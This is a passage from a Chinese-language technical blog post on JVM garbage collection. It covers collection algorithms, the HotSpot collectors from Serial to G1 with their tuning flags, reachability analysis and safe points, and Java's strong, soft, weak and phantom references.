<p><img src="https://csn.damyoung.cn/%E6%A0%87%E8%AE%B0-%E6%B8%85%E9%99%A4%E7%AE%97%E6%B3%95.jpeg" alt="标记-清除算法"></p>
<h3 id="复制算法"><a href="#复制算法" class="headerlink" title="复制算法"></a>复制算法</h3><p>为了解决效率问题，出现了“复制”收集算法。它可以将内存分为大小相同的两块，每次使用其中的一块。当这一块内存使用完后，就将还存活的对象复制到另一块中去，然后把使用的空间一次清理掉。这样就使每次的内存回收都是对内存区间的一半进行回收。</p>
<p><img src="https://csn.damyoung.cn/%E5%A4%8D%E5%88%B6%E7%AE%97%E6%B3%95.jpeg" alt="复制算法"></p>
<p>上面提到的虚拟机对新生代的回收中，<code>Eden</code>和<code>Survivor</code>就是使用了这种算法。</p>
<p>HotSpot 虚拟机的<code>Eden</code>和<code>Survivor</code>大小比例默认为<code>8:1</code>，保证了内存的利用率达到 90%。如果每次回收有多于 10% 的对象存活，那么一块<code>Survivor</code>就不够用了，此时需要依赖于老年代进行<strong>空间分配担保</strong>，也就是借用老年代的空间存储放不下的对象。</p>
<h3 id="标记-整理算法"><a href="#标记-整理算法" class="headerlink" title="标记-整理算法"></a>标记-整理算法</h3><p>根据老年代的特点提出的一种标记算法，标记过程仍然与“标记-清除”算法一样，但后续步骤不是直接对可回收对象回收，而是让所有存活的对象向一端移动，然后直接清理掉端边界以外的内存。</p>
<p><img src="https://csn.damyoung.cn/%E6%A0%87%E8%AE%B0-%E6%95%B4%E7%90%86%E7%AE%97%E6%B3%95.jpeg" alt="标记-整理算法"></p>
<p>优点：不会产生内存碎片</p>
<p>缺点：需要移动大量对象，处理效率比较低</p>
<h3 id="分代收集算法"><a href="#分代收集算法" class="headerlink" title="分代收集算法"></a>分代收集算法</h3><p>当前虚拟机的垃圾收集都是采用分代收集算法，这种算法根据对象存活周期的不同将内存划分为几块，一般将 java 堆划分为新生代和老年代，根据各个年代特点选择合适的垃圾收集算法。</p>
<p><strong>在新生代中，每次收集都会有大量对象死去，所以可以选择复制算法，只要付出少量对象的复制成本就可以完成每次垃圾收集。而在老年代的对象存活几率是比较高的，而且没有额外的空间对它进行分配担保，所以必须选择“标记-清除”或者“标记-整理”算法进行垃圾收集。</strong></p>
<blockquote>
<p>延伸面试问题：为什么HotSpot要分为新生代和老年代。<br>根据上面对分代收集算法介绍回答</p>
</blockquote>
<h2 id="2、垃圾回收器"><a href="#2、垃圾回收器" class="headerlink" title="2、垃圾回收器"></a>2、垃圾回收器</h2><p>如果说收集算法是内存回收的方法论，那么垃圾收集器就是内存回收的具体实现。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>对于 GC 来说，当程序员创建对象时，GC 就开始监控这个对象的地址、大小以及使用情况。通常，GC <strong>采用有向图的方式记录和管理堆(heap)中的所有对象</strong>。通过这种方式确定哪些对象是“可达的”，哪些对象是“不可达的”。当 GC 确定一些对象为“不可达”时，GC 就有责任回收这些内存空间。程序员可以手动执行 <code>System.gc()</code>，通知 GC 运行，但是Java语言规范并不保证 GC 一定会执行。</p>
<p><img src="http://qiniu.xiaoming.net.cn/%E4%B8%83%E7%A7%8D%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E5%99%A8.jpg" alt="七种垃圾收集器"></p>
<p>以上是HotSpot虚拟机中的7个垃圾收集器，连线表示垃圾收集器可以配合使用。</p>
<h3 id="Serial收集器"><a href="#Serial收集器" class="headerlink" title="Serial收集器"></a>Serial收集器</h3><p><code>Serial</code>（串行）收集器是最基本、历史最悠久的垃圾收集器。这是一个单线程收集器，它的“单线程”的意义不仅仅意味着它只会使用一条垃圾收集线程去完成垃圾收集工作，更重要的是它在进行垃圾收集工作的时候必须暂停其他所有的工作线程（“Stop The World”），直到它收集结束。</p>
<p><img src="https://qiniu.xiaoming.net.cn/Serial%E6%94%B6%E9%9B%86%E5%99%A8.jpeg" alt="Serial收集器"></p>
<p><strong>新生采用复制算法，老年代采用标记-整理算法</strong>。</p>
<p>虚拟机的设计者们当然知道<code>Stop The World</code>带来的不良用户体验，所以在后续的垃圾收集器设计中停顿时间在不断缩短（仍然还有停顿，寻找最优秀的垃圾收集器的过程仍然在继续）。</p>
<p>但是<code>Serial</code>收集器有没有优于其他垃圾收集器的地方呢？当然有，它简单而高效（与其他收集器的单线程相比）。<code>Serial</code>收集器由于没有线程交互的开销，自然可以获得很高的单线程收集效率。<code>Serial</code>收集器对于运行在<code>Client</code>模式下的虚拟机来说是个不错的选择。</p>
<p>JVM配置参数为：<code>-XX:+UseSerialGC</code>，使用该配置参数，新生代和老年代均使用串行垃圾回收器，其中老年代为基于标记压缩算法实现的Serial Old。</p>
<h3 id="ParNew收集器"><a href="#ParNew收集器" class="headerlink" title="ParNew收集器"></a>ParNew收集器</h3><p><code>ParNew</code>收集器其实就是<code>Serial</code>收集器的多线程版本，除了使用多线程进行垃圾收集外，其余行为（控制参数、收集算法、回收策略等等）和<code>Serial</code>收集器是完全一样的。</p>
<p><img src="https://qiniu.xiaoming.net.cn/ParNew%E6%94%B6%E9%9B%86%E5%99%A8.jpg" alt="ParNew收集器"></p>
<p><strong>新生代采用复制算法，老年代采用标记-整理算法</strong></p>
<p>它是许多运行在<code>Server</code>模式下的虚拟机的首要选择，（<code>Server</code>场景下默认的新生代收集器），主要是因为除了<code>Serial</code>收集器外，只有它能与<code>CMS</code>收集器（真正意义上的并发收集器）配合工作。</p>
<p>配置方式：如果老年代配置了使用 CMS 垃圾回收器，则新生代默认使用 ParNew，不需要显示配置。如果需要显示配置，则JVM参数为：<code>-XX:+UseParNewGC</code>。其中 ParNew 和 CMS 的组合是响应时间优先的。如果年轻代的并行GC不想开启，可以通过设置<code>-XX：-UseParNewGC</code>来关掉。</p>
<h4 id="并行和并发概念补充："><a href="#并行和并发概念补充：" class="headerlink" title="并行和并发概念补充："></a>并行和并发概念补充：</h4><ul>
<li><code>并行（Parallel）</code> ：指多条垃圾收集线程并行工作，但此时用户线程仍然处于等待状态。</li>
<li><code>并发（Concurrent）</code>：指用户线程与垃圾收集线程同时执行（但不一定是并行，可能会交替执行），用户程序在继续运行，而垃圾收集器运行在另一个 CPU 上。</li>
</ul>
<h3 id="Parallel-Scavenge收集器"><a href="#Parallel-Scavenge收集器" class="headerlink" title="Parallel Scavenge收集器"></a>Parallel Scavenge收集器</h3><p><code>Parallel Scavenge</code>（并行清除）收集器也是使用复制算法的多线程收集器，其关注的重点是<strong>吞吐量（高效率的利用CPU）</strong>。CMS等垃圾收集器的关注点更多的是用户线程的停顿时间（提高用户体验）。所谓吞吐量就是<strong>CPU中用于运行用户代码的时间与CPU总消耗时间的比值</strong>。<code>Parallel Scavenge</code>收集器提供了很多参数供用户找到最合适的停顿时间或最大吞吐量，如果对于收集器运作不太了解的话，手工优化存在困难的话可以选择把内存管理优化交给虚拟机去完成。</p>
<p>![Parallel Scavenge收集器](<a href="https://qiniu.xiaoming.net.cn/Parallel">https://qiniu.xiaoming.net.cn/Parallel</a> Scavenge收集器.jpg)</p>
<p><strong>新生代采用复制算法，老年代采用标记-整理算法</strong></p>
<ul>
<li>JVM配置参数为：<code>-XX:+UseParallelGC</code>，该配置参数只对新生代有效，即新生代使用并行垃圾回收器，老年代使用Serial Old串行回收器。这个也是运行在 server 模式的JVM进程的默认垃圾收集器配置，即新生代 Parallel，老年代Serial Old。</li>
<li>吞吐量目标：Parallel 垃圾回收器为了实现可控制的吞吐量，通过JVM参数：<code>-XX:MaxGCPauseMillis</code>来控制垃圾回收的最大停顿时间，<code>-XX:GCTimeRatio</code>直接控制吞吐量的大小。</li>
<li>可控制吞吐量的实现：通过JVM参数：<code>-XX:+UseAdaptiveSizePolicy</code>来开启动态调整堆的大小来达到吞吐量控制目的，此时不需要配置堆的新生代，老年代的大小，只需要配置基本的堆配置，如最大大小。通过JVM参数： <code>-XX:ParallelGCThreads=20</code>配置并行收集器的线程数，一般设置为和处理器数量相同。</li>
</ul>
<h3 id="Serial-Old收集器"><a href="#Serial-Old收集器" class="headerlink" title="Serial Old收集器"></a>Serial Old收集器</h3><p><code>Serical</code>收集器的老年代版本，同样是一个单线程的收集器，也是给<code>Client</code>场景下的虚拟机使用。如果用在<code>Server</code>场景下，它主要有两个作用：</p>
<ul>
<li>在JDK1.5以及以前的版本中与<code>Parallel Scavenge</code>收集器搭配使用</li>
<li>作为<code>CMS</code>收集器的后备方案，在并发收集发生<code>Concurrent Mode Failure</code>时使用。</li>
</ul>
<p>![Serial Old收集器](<a href="https://qiniu.xiaoming.net.cn/Serial">https://qiniu.xiaoming.net.cn/Serial</a> Old收集器.jpg)</p>
<p>配置方式为：<code>-XX:+UseSerialGC</code>，此时老年代和新生代均使用串行垃圾回收器。</p>
<h3 id="Parallel-Old收集器"><a href="#Parallel-Old收集器" class="headerlink" title="Parallel Old收集器"></a>Parallel Old收集器</h3><p><code>Parallel Scavenge</code>收集器的老年代版本，使用多线程和“标记-整理”算法，在注重吞吐量以及CPU资源的场合，都可以优先考虑<code>Parallel Scavenge</code>和<code>Parallel Old</code>收集器。</p>
<p>![Parallel Old收集器](<a href="https://qiniu.xiaoming.net.cn/Parallel">https://qiniu.xiaoming.net.cn/Parallel</a> Old收集器.jpg)</p>
<p>当新生代使用：<code>-XX:+UseParallelGC</code> 开启时，老年代使用的还是 <code>Serial Old</code>，故需要显示配置：<code>-XX:+UseParallelOldGC</code>来指定老年代使用并行 Parallel Old 垃圾回收器。</p>
<h3 id="CMS收集器"><a href="#CMS收集器" class="headerlink" title="CMS收集器"></a>CMS收集器</h3><p><code>CMS(Concurrent Mark Sweep)</code>收集器是一种以获取最短回收停顿时间为目标的收集器。它非常符合注重用户体验的应用上使用。</p>
<p><code>CMS</code>收集器是HotSpot虚拟机上第一款真正意义上的并发收集器，它第一次实现了让垃圾收集线程与用户线程（基本上）同时工作。</p>
<p>从名字中的<code>Mark Sweep</code>这两个词可以看出，<code>CMS</code>收集器是一种“标记-清除”算法实现的，它的运作过程相比于前面几种垃圾收集器来说更加复杂一些。整个过程分为四个步骤：</p>
<ul>
<li>初始标记： 暂停所有的其他线程，并记录下直接与 root 相连的对象，速度很快 ；</li>
<li>并发标记： 同时开启 GC 和用户线程，用一个闭包结构去记录可达对象。但在这个阶段结束，这个闭包结构并不能保证包含当前所有的可达对象。因为用户线程可能会不断的更新引用域，所以 GC 线程无法保证可达性分析的实时性。所以这个算法里会跟踪记录这些发生引用更新的地方。</li>
<li>重新标记： 重新标记阶段就是为了修正并发标记期间因为用户程序继续运行而导致标记产生变动的那一部分对象的标记记录，这个阶段的停顿时间一般会比初始标记阶段的时间稍长，远远比并发标记阶段时间短</li>
<li>并发清除： 开启用户线程，同时 GC 线程开始对为标记的区域做清扫。</li>
</ul>
<p><img src="https://qiniu.xiaoming.net.cn/CMS%E6%94%B6%E9%9B%86%E5%99%A8.jpeg" alt="CMS收集器"></p>
<p><code>CMS</code>收集器的主要优点是：<strong>并发收集、低停顿</strong>。但它有下面三个明显的缺点：</p>
<ul>
<li>吞吐量低：低停顿时间是以牺牲吞吐量为代价的，导致 CPU 利用率不够高。</li>
<li>无法处理浮动垃圾，可能出现<code>Concurrent Mode Failure</code>。浮动垃圾是指并发清除阶段由于用户线程继续运行而产生的垃圾，这部分垃圾只能到下一次 GC 时才能进行回收。由于浮动垃圾的存在，因此需要预留出一部分内存，意味着 CMS 收集不能像其它收集器那样等待老年代快满的时候再回收。如果预留的内存不够存放浮动垃圾，就会出现 <code>Concurrent Mode Failure</code>，这时虚拟机将临时启用 Serial Old 来替代 CMS。</li>
<li>它使用的回收算法“标记-清除”算法会导致收集结束时有大量的空间碎片产生。往往出现老年代空间剩余，但无法找到足够大连续空间来分配当前对象，不得不提前触发一次 Full GC。</li>
</ul>
<p>解决这个问题的办法就是可以让 CMS 在进行一定次数的 <code>Full GC</code>（标记清除）的时候进行一次标记整理算法，CMS 提供了以下参数来控制：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-XX:UseCMSCompactAtFullCollection</span><br><span class="line">-XX:CMSFullGCBeforeCompaction&#x3D;5</span><br></pre></td></tr></table></figure>

<p>使用<code>-XX:+UseConcMarkSweepGC</code>开启CMS收集器</p>
<p>也就是 CMS 在进行5次 <code>Full GC</code>（标记清除）之后进行一次标记整理算法，从而可以控制老年带的碎片在一定的数量以内，甚至可以配置 CMS 在每次 <code>Full GC</code> 的时候都进行内存的整理。</p>
<h3 id="G1收集器"><a href="#G1收集器" class="headerlink" title="G1收集器"></a>G1收集器</h3><p><code>G1(Garbage-First)</code>是一款面向服务器的垃圾收集器,主要针对配备多颗处理器及大容量内存的机器. 以极高概率满足 GC 停顿时间要求的同时,还具备高吞吐量性能特征.</p>
<p>被视为 JDK1.7 中 HotSpot 虚拟机的一个重要进化特征。它具备一下特点:</p>
<ul>
<li><strong>并行与并发</strong>：G1 能充分利用 CPU、多核环境下的硬件优势，使用多个 CPU（CPU 或者 CPU 核心）来缩短<code>Stop-The-World</code>停顿时间。部分其他收集器原本需要停顿 Java 线程执行的 GC 动作，G1 收集器仍然可以通过并发的方式让 java 程序继续执行。</li>
<li>分代收集：虽然 G1 可以不需要其他收集器配合就能独立管理整个 GC 堆，但是还是保留了分代的概念。</li>
<li>空间整合：与 CMS 的“标记–清理”算法不同，G1 从整体来看是基于“标记整理”算法实现的收集器；从局部上来看是基于“复制”算法实现的。</li>
<li>可预测的停顿：这是 G1 相对于 CMS 的另一个大优势，降低停顿时间是 G1 和 CMS 共同的关注点，但 G1 除了追求低停顿外，还能建立可预测的停顿时间模型，能让使用者明确指定在一个长度为 M 毫秒的时间片段内。</li>
</ul>
<p>G1 收集器的运作大致分为以下几个步骤：</p>
<ul>
<li>初始标记</li>
<li>并发标记</li>
<li>最终标记</li>
<li>筛选回收</li>
</ul>
<p>G1 把堆划分成多个大小相等的独立区域（<code>Region</code>），新生代和老年代不再物理隔离。</p>
<p><img src="https://qiniu.xiaoming.net.cn/G1%E4%B8%ADRegion%E6%A6%82%E5%BF%B5.png" alt="G1中Region概念"></p>
<p>通过引入<code>Region</code>的概念，从而将原来的一整块内存空间划分成多个的小空间，使得每个小空间可以单独进行垃圾回收。这种划分方法带来了很大的灵活性，使得可预测的停顿时间模型成为可能。G1 收集器在后台维护了一个优先列表，每次根据允许的收集时间，优先选择回收价值最大的<code>Region</code>(地区，范围)(这也就是它的名字 Garbage-First 的由来)。这种使用<code>Region</code>划分内存空间以及有优先级的区域回收方式，保证了 GF 收集器在有限时间内可以尽可能高的收集效率（把内存化整为零）。</p>
<p>每个<code>Region</code>都有一个<code>Remembered Set</code>，用来记录该<code>Region</code>对象的引用对象所在的<code>Region</code>。通过使用<code>Remembered Set</code>，在做可达性分析的时候就可以避免全堆扫描。</p>
<p><img src="https://qiniu.xiaoming.net.cn/G1%E6%94%B6%E9%9B%86%E5%99%A8.jpg" alt="G1收集器"></p>
<p>如果不计算维护<code>Remembered Set</code>的操作，G1 收集器的运作大致可划分为以下几个步骤：</p>
<ul>
<li>初始标记</li>
<li>并发标记</li>
<li>最终标记：为了修正在并发标记期间因用户程序继续运作而导致标记产生变动的那一部分标记记录，虚拟机将这段时间对象变化记录在线程的<code>Remembered Set Logs</code>里面，最终标记阶段需要把<code>Remembered Set Logs</code>的数据合并到<code>Remembered Set</code>中。这阶段需要停顿线程，但是可并行执行。</li>
<li>筛选回收：首先对各个<code>Region</code>中的回收价值和成本进行排序，根据用户所期望的 GC 停顿时间来制定回收计划。此阶段其实也可以做到与用户程序一起并发执行，但是因为只回收一部分<code>Region</code>，时间是用户可控制的，而且停顿用户线程将大幅度提高收集效率。</li>
</ul>
<p>G1收集器具备如下特点：</p>
<ul>
<li>空间整合：整体来看是基于“标记 - 整理”算法实现的收集器，从局部（两个 Region 之间）上来看是基于“复制”算法实现的，这意味着运行期间不会产生内存空间碎片。</li>
<li>可预测的停顿：能让使用者明确指定在一个长度为 M 毫秒的时间片段内，消耗在 GC 上的时间不得超过 N 毫秒。</li>
</ul>
<p>G1的设计规则就是可以通过简单明了的方式来进行性能调优，典型配置只需要如以下配置：指定堆的最大大小，指定GC的最大停顿时间，则G1垃圾收集器会想办法满足这个目标。如果我们需要调优，在内存大小一定的情况下，我们只需要修改最大暂停时间即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-XX:+UseG1GC -Xmx32g -XX:MaxGCPauseMillis&#x3D;200</span><br></pre></td></tr></table></figure>

<h2 id="3、如何判断一个常量是废弃常量"><a href="#3、如何判断一个常量是废弃常量" class="headerlink" title="3、如何判断一个常量是废弃常量"></a>3、如何判断一个常量是废弃常量</h2><p>运行时常量池主要回收的是废弃的常量。</p>
<p>假如在常量池中存在字符串 “abc”，如果当前没有任何<code>String</code>对象引用该字符串常量的话，就说明常量 “abc” 就是废弃常量，如果这时发生内存回收的话而且有必要的话，”abc” 就会被系统清理出常量池。</p>
<blockquote>
<p>JDK1.7 及之后版本的 JVM 已经将运行时常量池从方法区中移了出来，在 Java 堆（Heap）中开辟了一块区域存放运行时常量池。</p>
</blockquote>
<h2 id="4、如何判断一个类是无用的类（方法区的回收）"><a href="#4、如何判断一个类是无用的类（方法区的回收）" class="headerlink" title="4、如何判断一个类是无用的类（方法区的回收）"></a>4、如何判断一个类是无用的类（方法区的回收）</h2><p>方法区主要回收的是无用的类，判断一个常量是否是“废弃常量”比较简单，而判断一个类是否是“无用的类”，需要同时满足下面3个条件才能算是“无用的类”：</p>
<ul>
<li>该类的所有实例都已经被回收，也就是java堆中不存在该类的任何实例</li>
<li>加载该类的<code>ClassLoader</code>已经被回收</li>
<li>该类对应的<code>java.lang.Class</code>对象没有在任何地方被引用，无法在任何地方通过反射访问该类的方法。</li>
</ul>
<p>虚拟机可以对满足上述 3 个条件的无用类进行回收，这里说的仅仅是“可以”，而并不是和对象一样不使用了就会必然被回收。</p>
<h2 id="5、如何判断对象已经死亡"><a href="#5、如何判断对象已经死亡" class="headerlink" title="5、如何判断对象已经死亡"></a>5、如何判断对象已经死亡</h2><p>堆中几乎放着所有的对象实例，对堆垃圾回收前的第一步就是要判断哪些对象已经死亡（即不能再被任何途径使用的对象）</p>
<h3 id="引用计数法"><a href="#引用计数法" class="headerlink" title="引用计数法"></a>引用计数法</h3><p>给对象中添加一个引用计数器，每当有一个地方引用它，计数器就加1；当引用失效时，计数器就减1；任何计数器为0的对象就是不可能再被使用的。</p>
<p>这个方法实现简单，效率高，但是目前主流的虚拟机中并没有选择这个算法来管理内存，主要原因是它很难解决对象之间相互循环引用的问题。所谓对象之间的相互循环引用的问题。所谓对象之间的相互引用问题，指的是除了对象A和对象B相互引用着对方之外，这两个对象之间再无任何引用，但是它们因为互相引用对方，导致它们的引用的计数器都不为0，于是引用计数算法无法通知GC回收器回收它们。</p>
<h3 id="可达性分析算法"><a href="#可达性分析算法" class="headerlink" title="可达性分析算法"></a>可达性分析算法</h3><p>这个算法的基本思想就是通过一系列的称为<strong>GC Roots</strong>的对象作为起点，从这些结点开始向下搜索，节点所走过的路径称为<strong>引用链</strong>，当一个对象到<strong>GC Roots</strong>没有任何引用链相连的话，则证明此对象是不可用的。</p>
<p><img src="https://qiniu.xiaoming.net.cn/%E5%8F%AF%E8%BE%BE%E6%80%A7%E5%88%86%E6%9E%90%E7%AE%97%E6%B3%95.jpeg" alt="可达性分析算法"></p>
<p><strong>GC Roots一般包含以下内容/JVM中哪些对象可以作为Root对象？</strong>：</p>
<ul>
<li>虚拟机栈中局部变量表中引用的对象</li>
<li>本地方法栈中JNI引用的对象</li>
<li>方法区中类静态属性引用的对象</li>
<li>方法区中的常量引用的对象</li>
</ul>
<h3 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h3><p>HotSpot 首先需要枚举所有的 GC Roots 根节点，虚拟机栈的空间不大，遍历一次的时间或许可以接受，但是方法区的空间很可能就有数百兆，遍历一次需要很久。更加关键的是，当遍历所有 GC Roots 根节点时，我们需要暂停所有用户线程，因为我们需要一个此时此刻的”虚拟机快照”，找到此时此刻的可达性分析关系图。基于这种情况，HotSpot 实现了一种叫做 OopMap 的数据结构，存储 GC Roots 对象，同时并不是每个指令都会对 OopMap 进行修改，这样 OopMap 很庞大，这里 Hotspot 引入了安全点，safePoint，只会在Safe Point 处记录 GC Roots 信息。</p>
<blockquote>
<p>OopMap: 虚拟机从外部记录下栈里那些 Reference 类型变量的类型信息，存成的一个映射表。</p>
</blockquote>
<h4 id="枚举根节点"><a href="#枚举根节点" class="headerlink" title="枚举根节点"></a>枚举根节点</h4><p>GC Roots 主要存在全局性的引用(常量和类静态属性)和执行上下文(栈帧的本地变量表)中</p>
<p>可达性分析的执行对“引用一致性”非常地敏感，所以在枚举根节点时必须停顿所有线程。</p>
<blockquote>
<p><strong>引用一致性</strong>：指当 JVM 进行可达性分析时，必须保持当前的引用链是保持不变的，否则分析结果有可能会出现偏差。例如：在分析某个对象时得出其余 GC Roots 不可达的结论，但是在分析完成之前此对象在某一个地方被重新引用，但是 JVM 是不会重复进行分析的，显然结果会不正确。</p>
</blockquote>
<p>为了缩短停顿时间，HotSpot使用一组 OopMap 的数据结构达到目的，在类加载完成时，HotSpot 就把对象内什么偏移量上是什么类型的数据计算出来，并且存放在 OopMap 中，GC 在扫描时遍历 OopMap 就可以得到所有引用关系了。</p>
<h4 id="安全点-Safe-Points"><a href="#安全点-Safe-Points" class="headerlink" title="安全点(Safe Points)"></a>安全点(Safe Points)</h4><p>如果在程序中含有大量的指令，对象引用关系不断变化，每一次变化都会生成一条新的 OopMap，那么必然会导致 OopMap 也变得越来越庞大，遍历所使用的开销也会越来越大，此时使用安全点这种解决方案可以有效地解决这个问题。</p>
<p>安全点就是用来<strong>解决什么时候安全地进入GC的问题，安全点能够让所有线程进行中断挂起</strong>。</p>
<p>Safe Point的意义：保证所有线程当前的所有引用状态不会发生变化，所有线程要保证在安全点处中断。</p>
<p>JVM 进入 GC 阶段的两种线程中断方式(不是安全点的中断方式)：</p>
<ol>
<li>抢先式中断：</li>
</ol>
<p>在 GC 发生时，让所有的线程进行中断，如果发现线程不是在安全点上，那么就恢复它，让它跑到安全点再进行中断。现在几乎没有虚拟机采用抢先式中断来暂停线程进行响应 GC 事件，突然地中断和恢复线程会导致程序出现很奇怪的现象。</p>
<ol>
<li>主动式中断：</li>
</ol>
<p>当 GC 操作需要中断线程时，不直接对线程进行操作，而是设置一个轮询标志，让线程执行时主动轮询这一个标志，轮询标志为 true 时主动中断；轮询标志的地方和安全点是重合的，另外还有创建对象需要分配内存的地方也会有轮询标志。这样保证了线程执行到JVM认为该线程可以停止的地方，而不会突然地中断线程了。</p>
<p>Safe Point通常存在的位置：</p>
<ol>
<li>方法调用处</li>
<li>循环跳转处</li>
<li>异常跳转处</li>
<li>指令序列复用</li>
</ol>
<p>Safe Points位置的选取特征：是否具有让程序长时间运行的特征。</p>
<h4 id="安全区域-Safe-Region"><a href="#安全区域-Safe-Region" class="headerlink" title="安全区域(Safe Region)"></a>安全区域(Safe Region)</h4><p>如果程序不执行，有可能处于 Sleep 或 Blocked 状态，CPU没有分配给线程使用，此时线程肯定无法自己“跑”到安全点处再执行中断挂起，而 JVM 也不可能等待线程被唤醒，安全点这种方案无法满足 GC 的要求，所以此时需要采用安全区域方案。</p>
<p>安全区域是指在一段代码片段之中，引用关系不会发生变化，在此区域内的任何地方进行GC操作都是安全的，我们可以这样理解：安全区域就是一小块含有无穷无尽的安全点的区域。</p>
<p>执行过程：</p>
<p>在线程进入安全区域时，线程将主动标记自己进入了安全区域，此时 JVM 发起 GC 时就不用在乎这些在安全区域的线程了，当线程要离开安全区域时，它会检查系统是否已经完成了根节点枚举或者整个 GC 过程，如果已完成，则可以离开；若未完成，则需要等待允许离开安全区域的信号为止。</p>
<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>无论是通过引用计数器判断对象引用数量，还是通过可达性分析法判断对象的引用链是否可达，判断对象的存活都与“引用”有关。</p>
<p>JDK1.2 之前，Java 中引用的定义很传统：如果<code>reference</code>类型的数据存储的数值代表的是另一块内存的起始地址，就称这块内存代表一个引用。</p>
<p>JDK1.2 以后，Java 对引用的概念进行了扩充，将引用分为强引用、软引用、弱引用、虚引用四种（引用强度逐渐减弱）</p>
<h4 id="强引用"><a href="#强引用" class="headerlink" title="强引用"></a>强引用</h4><p>我们使用的大部分引用实际上都是强引用，这是使用最普遍的引用。如果一个对象具有强引用，那就类似于必不可少的生活用品，<strong>垃圾回收器绝对不会回收它</strong>。当内存空间不足，Java虚拟机宁愿抛出<code>OutOfMemoryError</code>错误，使程序异常终止，也不会回收具有强引用的对象来解决内存不足问题。</p>
<h4 id="软引用-SoftReference"><a href="#软引用-SoftReference" class="headerlink" title="软引用(SoftReference)"></a>软引用(SoftReference)</h4><p>如果一个对象只具有软引用，那就类似于可有可无的生活用品。如果内存空间足够，垃圾回收器就不会回收它，如果内存空间不足了，就会回收这些对象的内存。只要垃圾回收器没有回收它，该对象就可以被程序使用。软引用可用来实现内存敏感的高速缓存。</p>
<p>软引用可以和一个引用队列（<code>ReferenceQueue</code>）联合使用，如果软引用所引用的对象被垃圾回收，JAVA 虚拟机就会把这个软引用加入到与之关联的引用队列中。</p>
<p>使用<code>SoftReference</code>类来创建软引用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Object obj &#x3D; new Object();</span><br><span class="line">SoftReference&lt;Object&gt; sf &#x3D; new SoftReference&lt;Object&gt;(obj);</span><br><span class="line">obj &#x3D; null;&#x2F;&#x2F;使对象只被软引用关联</span><br></pre></td></tr></table></figure>

<h4 id="弱引用-WeakReference"><a href="#弱引用-WeakReference" class="headerlink" title="弱引用(WeakReference)"></a>弱引用(WeakReference)</h4><p>如果一个对象只具有弱引用，那就类似于可有可无的生活用品。弱引用与软引用的区别在于：只具有弱引用的对象拥有更短暂的生命周期。在垃圾回收器线程扫描它所管辖的内存区域的过程中，一旦发现了只具有弱引用的对象，不管当前内存空间足够与否，都会回收它的内存。不过，由于垃圾回收器是一个优先级很低的线程， 因此不一定会很快发现那些只具有弱引用的对象。</p>
<p>弱引用可以和一个引用队列（<code>ReferenceQueue</code>）联合使用，如果弱引用所引用的对象被垃圾回收，Java 虚拟机就会把这个弱引用加入到与之关联的引用队列中。</p>
<p>使用<code>WeakReference</code>类来创建弱引用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Object obj &#x3D; new Object();</span><br><span class="line">WeakReference&lt;Object&gt; wf &#x3D; new WeakReference&lt;Object&gt;(obj);</span><br><span class="line">obj &#x3D; null;</span><br></pre></td></tr></table></figure>

<h4 id="虚引用-PhantomReference"><a href="#虚引用-PhantomReference" class="headerlink" title="虚引用(PhantomReference)"></a>虚引用(PhantomReference)</h4><p>“虚引用”顾名思义，就是形同虚设，与其他几种引用都不同，虚引用并不会决定对象的生命周期。如果一个对象仅持有虚引用，那么它就和没有任何引用一样，在任何时候都可能被垃圾回收。</p>
<p><strong>虚引用主要用来跟踪对象被垃圾回收的活动</strong>,为一个对象设置虚引用的唯一目的是能在这个对象被回收时收到一个系统通知。</p>
<p>虚引用和软引用的一个区别在于：<strong>虚引用必须和引用队列（<code>ReferenceQueue</code>）联合使用</strong>。当垃圾回收器准备回收一个对象时，如果发现它还有虚引用，就会在回收对象的内存之前，把这个虚引用加入到与之关联的引用队列中。程序可以通过判断引用队列中是否已经加入了虚引用，来了解被引用的对象是否将要被垃圾回收。程序如果发现某个虚引用已经被加入到了引用队列，那么就可以在所引用的对象的内存被回收之前采取必要的行动。</p>
<p>特别注意，在程序设计中一般很少使用弱引用与虚引用，使用软引用的情况较多，这是因为软引用可以加速 JVM 对垃圾内存的回收速度，可以维护系统的运行安全，防止内存溢出（<code>OutOfMemory</code>）等问题的产生。</p>
<p>使用<code>PhantomReference</code>来创建虚引用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Object obj &#x3D; new Object();</span><br><span class="line">PhantomReference&lt;Object&gt; pf &#x3D; new PhantomReference&lt;Object&gt;(obj,null);</span><br><span class="line">obj &#x3D; null;</span><br></pre></td></tr></table></figure>

<h3 id="不可达对象并非是“非死不可”"><a href="#不可达对象并非是“非死不可”" class="headerlink" title="不可达对象并非是“非死不可”"></a>不可达对象并非是“非死不可”</h3><p>即使在可达性分析法中不可达的对象，也并非是“非死不可”的，这时候它们暂时处于“缓刑阶段”，要真正宣告一个对象死亡，至少要经历两次标记过程：可达性分析法中不可达的对象被第一次标记并且进行一次筛选，筛选的条件是此对象是否有必要执行<code>finalize</code>方法。当对象没有覆盖<code>finalize</code>方法，或者<code>finalize</code>方法已经被虚拟机调用过时，虚拟机将这两种情况视为没必要执行。</p>
<blockquote>
<p><code>finalize()</code>用于关闭外部资源，但是<code>try-finally</code>等方式可以做得更好，并且该方式运行代价很高，不确定性大，无法保证各个对象的调用顺序，因此最好不要使用。<br>当一个对象可被回收时，如果需要执行该对象的<code>finalize()</code>方法，那么就有可能在该方法中让对象重新被引用，从而实现自救。<strong>自救只能进行一次，如果回收的对象之前调用了<code>finalize()</code>方法自救，后面回收时就不会再调用该方法</strong>。</p>
</blockquote>
<p>如果对象被认为有必要执行<code>finalize()</code>方法，那么这个方法会被放置在一个名为<code>F-Queue</code>的队列之中，并在稍后由一条由虚拟机自动建立的、低优先级的<code>Finalizer</code>线程去执行。这里的”执行”也只是指虚拟机会触发这个方法，但并不承诺一定会执行。</p>
<p><code>finalize()</code>方法是对象逃脱死亡命运的最后一次机会，稍后GC会对<code>F-Queue</code>中的对象进行第二次小规模的标记，如果对象在<code>finalize()</code>中重新与引用链上的任何一个对象建立了关联，就会被移出”即将回收”集合，如果没有移出，那就会被真的回收。</p>
